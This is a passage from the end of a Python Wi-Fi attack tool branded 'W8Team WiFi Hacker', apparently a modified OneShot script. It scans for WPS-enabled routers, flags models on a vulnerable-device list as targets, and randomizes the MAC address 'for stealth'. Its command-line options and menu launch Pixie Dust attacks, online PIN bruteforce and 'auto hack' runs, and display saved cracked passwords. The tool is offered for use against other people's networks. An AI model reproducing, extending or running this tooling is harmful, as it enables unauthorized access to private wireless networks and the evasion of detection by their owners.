        reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv'
        try:
            with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as file:
                csvReader = csv.reader(file, delimiter=';', quoting=csv.QUOTE_ALL)
                # Skip header
                next(csvReader)
                self.stored = []
                for row in csvReader:
                    self.stored.append(
                        (
                            row[1],   # BSSID
                            row[2]    # ESSID
                        )
                    )
        except FileNotFoundError:
            self.stored = []

    def iw_scanner(self) -> Dict[int, dict]:
        """Parsing iw scan results"""
        def handle_network(line, result, networks):
            networks.append(
                    {
                        'Security type': 'Unknown',
                        'WPS': False,
                        'WPS locked': False,
                        'Model': '',
                        'Model number': '',
                        'Device name': ''
                     }
                )
            networks[-1]['BSSID'] = result.group(1).upper()

        def handle_essid(line, result, networks):
            d = result.group(1)
            networks[-1]['ESSID'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_level(line, result, networks):
            networks[-1]['Level'] = int(float(result.group(1)))

        def handle_securityType(line, result, networks):
            sec = networks[-1]['Security type']
            if result.group(1) == 'capability':
                if 'Privacy' in result.group(2):
                    sec = 'WEP'
                else:
                    sec = 'Open'
            elif sec == 'WEP':
                if result.group(1) == 'RSN':
                    sec = 'WPA2'
                elif result.group(1) == 'WPA':
                    sec = 'WPA'
            elif sec == 'WPA':
                if result.group(1) == 'RSN':
                    sec = 'WPA/WPA2'
            elif sec == 'WPA2':
                if result.group(1) == 'WPA':
                    sec = 'WPA/WPA2'
            networks[-1]['Security type'] = sec

        def handle_wps(line, result, networks):
            networks[-1]['WPS'] = result.group(1)

        def handle_wpsLocked(line, result, networks):
            flag = int(result.group(1), 16)
            if flag:
                networks[-1]['WPS locked'] = True

        def handle_model(line, result, networks):
            d = result.group(1)
            networks[-1]['Model'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_modelNumber(line, result, networks):
            d = result.group(1)
            networks[-1]['Model number'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_deviceName(line, result, networks):
            d = result.group(1)
            networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        cmd = 'iw dev {} scan'.format(self.interface)
        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        lines = proc.stdout.splitlines()
        networks = []
        matchers = {
            re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
            re.compile(r'SSID: (.*)'): handle_essid,
            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
            re.compile(r'(capability): (.+)'): handle_securityType,
            re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
            re.compile(r' [*] Model: (.*)'): handle_model,
            re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
            re.compile(r' [*] Device name: (.*)'): handle_deviceName
        }

        for line in lines:
            if line.startswith('command failed:'):
                print('[!] Error:', line)
                return False
            line = line.strip('\t')
            for regexp, handler in matchers.items():
                res = re.match(regexp, line)
                if res:
                    handler(line, res, networks)

        # Filtering non-WPS networks
        networks = list(filter(lambda x: bool(x['WPS']), networks))
        if not networks:
            return False

        # Sorting by signal level
        networks.sort(key=lambda x: x['Level'], reverse=True)

        # Putting a list of networks in a dictionary, where each key is a network number in list of networks
        network_list = {(i + 1): network for i, network in enumerate(networks)}

        # Printing scanning results as table
        def truncateStr(s, length, postfix='…'):
            """
            Truncate string with the specified length
            @s — input string
            @length — length of output string
            """
            if len(s) > length:
                k = length - len(postfix)
                s = s[:k] + postfix
            return s

        def colored(text, color=None):
            """Returns colored text"""
            if color:
                if color == 'green':
                    text = '\033[92m{}\033[00m'.format(text)
                elif color == 'red':
                    text = '\033[91m{}\033[00m'.format(text)
                elif color == 'yellow':
                    text = '\033[93m{}\033[00m'.format(text)
                else:
                    return text
            else:
                return text
            return text

        if self.vuln_list:
            print('Network marks: {1} {0} {2} {0} {3}'.format(
                '|',
                colored('Possibly vulnerable', color='green'),
                colored('WPS locked', color='red'),
                colored('Already stored', color='yellow')
            ))
        print('Networks list:')
        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC device name', 'WSC model'))

        network_list_items = list(network_list.items())
        if self.reverse_scan:
            network_list_items = network_list_items[::-1]
        for n, network in network_list_items:
            number = f'{n})'
            model = '{} {}'.format(network['Model'], network['Model number'])
            essid = truncateStr(network['ESSID'], 25)
            deviceName = truncateStr(network['Device name'], 27)
            line = '{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
                number, network['BSSID'], essid,
                network['Security type'], network['Level'],
                deviceName, model
                )
            if (network['BSSID'], network['ESSID']) in self.stored:
                print(colored(line, color='yellow'))
            elif network['WPS locked']:
                print(colored(line, color='red'))
            elif self.vuln_list and (model in self.vuln_list):
                print(colored(line, color='green'))
            else:
                print(line)

        return network_list

    def prompt_network(self) -> str:
        networks = self.iw_scanner()
        if not networks:
            print('[-] No WPS networks found.')
            return
        while 1:
            try:
                networkNo = input('Select target (press Enter to refresh): ')
                if networkNo.lower() in ('r', '0', ''):
                    return self.prompt_network()
                elif int(networkNo) in networks.keys():
                    return networks[int(networkNo)]['BSSID']
                else:
                    raise IndexError
            except Exception:
                print('Invalid number')


def ifaceUp(iface, down=False):
    if down:
        action = 'down'
    else:
        action = 'up'
    cmd = 'ip link set {} {}'.format(iface, action)
    res = subprocess.run(cmd, shell=True, stdout=sys.stdout, stderr=sys.stdout)
    if res.returncode == 0:
        return True
    else:
        return False


def randomize_mac(interface):
    """Randomize MAC address for stealth"""
    try:
        # Generate random MAC address
        mac = [0x00, 0x16, 0x3e,
               random.randint(0x00, 0x7f),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff)]
        mac_str = ':'.join(map(lambda x: "%02x" % x, mac))
        
        # Set the new MAC address
        cmd_down = f'ip link set {interface} down'
        cmd_mac = f'ip link set {interface} address {mac_str}'
        cmd_up = f'ip link set {interface} up'
        
        subprocess.run(cmd_down, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        result = subprocess.run(cmd_mac, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(cmd_up, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        if result.returncode == 0:
            print(f'[+] MAC address randomized to: {mac_str}')
            return mac_str
        else:
            print('[-] Failed to randomize MAC address')
            return None
    except Exception as e:
        print(f'[-] MAC randomization error: {e}')
        return None


def get_signal_strength(interface, bssid):
    """Get signal strength for a specific BSSID"""
    try:
        cmd = f'iw dev {interface} scan | grep -A 5 -B 5 {bssid}'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        for line in result.stdout.split('\n'):
            if 'signal:' in line:
                signal = line.split('signal:')[1].split('dBm')[0].strip()
                return int(float(signal))
        return -100  # Default weak signal
    except:
        return -100


def die(msg):
    sys.stderr.write(msg + '\n')
    sys.exit(1)


def usage():
    return """
OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg

%(prog)s <arguments>

Required arguments:
    -i, --interface=<wlan0>  : Name of the interface to use

Optional arguments:
    -b, --bssid=<mac>        : BSSID of the target AP
    -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
    -K, --pixie-dust         : Run Pixie Dust attack
    -B, --bruteforce         : Run online bruteforce attack
    --push-button-connect    : Run WPS push button connection

Advanced arguments:
    -d, --delay=<n>          : Set the delay between pin attempts [0]
    -w, --write              : Write AP credentials to the file on success
    -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
    -X, --show-pixie-cmd     : Always print Pixiewps command
    --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
    --iface-down             : Down network interface when the work is finished
    -l, --loop               : Run in a loop
    -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
    --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
                               (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
    -v, --verbose            : Verbose output

Example:
    %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K
"""


def show_w8team_banner():
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    banner_text = f"""
╔═══════════════════ LIVE STATISTICS ═══════════════════╗
║ TIME: {current_time}                    ║
║ AUTHOR: W8Team/W8SOJIB                              ║
║ TELEGRAM: https://t.me/W8SOJIB                      ║
╚═══════════════════════════════════════════════════════╝
    """
    print(banner_text)


def show_main_menu():
    menu = """
╔══════════════════════════════════════════════════════════════╗
║                  🛡️  W8Team WiFi Hacker                     ║
║                    Advanced Auto System                      ║
║                     💚 This Tool Free 💚                     ║
╠══════════════════════════════════════════════════════════════╣
║  [1] 🚀 Auto Attack - Find High Vulnerability & Auto Hack    ║
║  [2] 📡 Scan & Attack WiFi - Select Target & Pixie Dust     ║
║  [3] 🔥 BruteForce Attack - Scan, Select & PIN Attack       ║
║  [4] 🤖 AI PIN Prediction - ALL 100 Million PINs Attack     ║
║  [5] 📋 View All Saved Passwords                            ║
║  [6] 📱 Tool Author - Open Telegram                         ║
║  [7] 🚪 Exit                                                ║
╚══════════════════════════════════════════════════════════════╝
    """
    print(menu)


if __name__ == '__main__':
    import argparse
    
    # Check if running with menu system (no arguments)
    if len(sys.argv) == 1:
        # Run interactive menu system
        if sys.hexversion < 0x03060F0:
            die("The program requires Python 3.6 and above")
        if os.getuid() != 0:
            die("Run it as root")
            
        # Start menu system
        menu_handler = MenuHandler()
        menu_handler.run_menu()
        sys.exit(0)

    parser = argparse.ArgumentParser(
        description='W8Team WiFi Hacker - Advanced Auto System v2.0',
        epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K'
        )

    parser.add_argument(
        '-i', '--interface',
        type=str,
        required=True,
        help='Name of the interface to use'
        )
    parser.add_argument(
        '-b', '--bssid',
        type=str,
        help='BSSID of the target AP'
        )
    parser.add_argument(
        '-p', '--pin',
        type=str,
        help='Use the specified pin (arbitrary string or 4/8 digit pin)'
        )
    parser.add_argument(
        '-K', '--pixie-dust',
        action='store_true',
        help='Run Pixie Dust attack'
        )
    parser.add_argument(
        '-F', '--pixie-force',
        action='store_true',
        help='Run Pixiewps with --force option (bruteforce full range)'
        )
    parser.add_argument(
        '-X', '--show-pixie-cmd',
        action='store_true',
        help='Always print Pixiewps command'
        )
    parser.add_argument(
        '-B', '--bruteforce',
        action='store_true',
        help='Run online bruteforce attack'
        )
    parser.add_argument(
        '--pbc', '--push-button-connect',
        action='store_true',
        help='Run WPS push button connection'
        )
    parser.add_argument(
        '-d', '--delay',
        type=float,
        help='Set the delay between pin attempts'
        )
    parser.add_argument(
        '-w', '--write',
        action='store_true',
        help='Write credentials to the file on success'
        )
    parser.add_argument(
        '--iface-down',
        action='store_true',
        help='Down network interface when the work is finished'
        )
    parser.add_argument(
        '--vuln-list',
        type=str,
        default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt',
        help='Use custom file with vulnerable devices list'
    )
    parser.add_argument(
        '-l', '--loop',
        action='store_true',
        help='Run in a loop'
    )
    parser.add_argument(
        '-r', '--reverse-scan',
        action='store_true',
        help='Reverse order of networks in the list of networks. Useful on small displays'
    )
    parser.add_argument(
        '--mtk-wifi',
        action='store_true',
        help='Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit '
             '(for internal Wi-Fi adapters implemented in MediaTek SoCs). '
             'Turn off Wi-Fi in the system settings before using this.'
    )
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Verbose output'
        )
    parser.add_argument(
        '--mac-rand',
        action='store_true',
        help='Randomize MAC address for stealth'
        )
    parser.add_argument(
        '--html-report',
        action='store_true',
        help='Generate HTML report after session'
        )
    parser.add_argument(
        '--json-export',
        action='store_true',
        help='Export session data as JSON'
        )
    parser.add_argument(
        '--threads',
        type=int,
        default=1,
        help='Number of threads for parallel attacks (experimental)'
        )

    args = parser.parse_args()

    if sys.hexversion < 0x03060F0:
        die("The program requires Python 3.6 and above")
    if os.getuid() != 0:
        die("Run it as root")

    if args.mtk_wifi:
        wmtWifi_device = Path("/dev/wmtWifi")
        if not wmtWifi_device.is_char_device():
            die("Unable to activate MediaTek Wi-Fi interface device (--mtk-wifi): "
                "/dev/wmtWifi does not exist or it is not a character device")
        wmtWifi_device.chmod(0o644)
        wmtWifi_device.write_text("1")

    if not ifaceUp(args.interface):
        die('Unable to up interface "{}"'.format(args.interface))

    # Initialize enhanced reporter
    if args.html_report or args.json_export:
        reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        reporter = EnhancedReporter(reports_dir)
        print(f'[*] Enhanced reporting enabled (Session ID: {reporter.session_data["session_id"]})')

    # MAC address randomization
    if args.mac_rand:
        print('[*] Randomizing MAC address for stealth...')
        randomize_mac(args.interface)

    show_w8team_banner()
    while True:
        try:
            show_w8team_banner()
            companion = Companion(args.interface, args.write, print_debug=args.verbose)
            if args.pbc:
                companion.single_connection(pbc_mode=True)
            else:
                if not args.bssid:
                    try:
                        with open(args.vuln_list, 'r', encoding='utf-8') as file:
                            vuln_list = file.read().splitlines()
                    except FileNotFoundError:
                        vuln_list = []
                    scanner = WiFiScanner(args.interface, vuln_list, reverse_scan=args.reverse_scan)
                    if not args.loop:
                        print('[*] BSSID not specified (--bssid) — scanning for available networks')
                    args.bssid = scanner.prompt_network()

                if args.bssid:
                    companion = Companion(args.interface, args.write, print_debug=args.verbose)
                    if args.bruteforce:
                        companion.smart_bruteforce(args.bssid, args.pin, args.delay)
                    else:
                        companion.single_connection(args.bssid, args.pin, args.pixie_dust,
                                                    args.show_pixie_cmd, args.pixie_force)
            if not args.loop:
                break
            else:
                args.bssid = None
        except KeyboardInterrupt:
            if args.loop:
                if input("\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").lower() == 'y':
                    print("Aborting…")
                    break
                else:
                    args.bssid = None
            else:
                print("\nAborting…")
                break

    # Generate reports if enabled
    if args.html_report or args.json_export:
        print('\n[*] Generating reports...')
        if args.html_report:
            html_file = reporter.generate_html_report()
            print(f'[+] HTML report saved: {html_file}')
        if args.json_export:
            json_file = reporter.save_json_report()
            print(f'[+] JSON data exported: {json_file}')

    if args.iface_down:
        ifaceUp(args.interface, down=True)

    if args.mtk_wifi:
        wmtWifi_device.write_text("0")
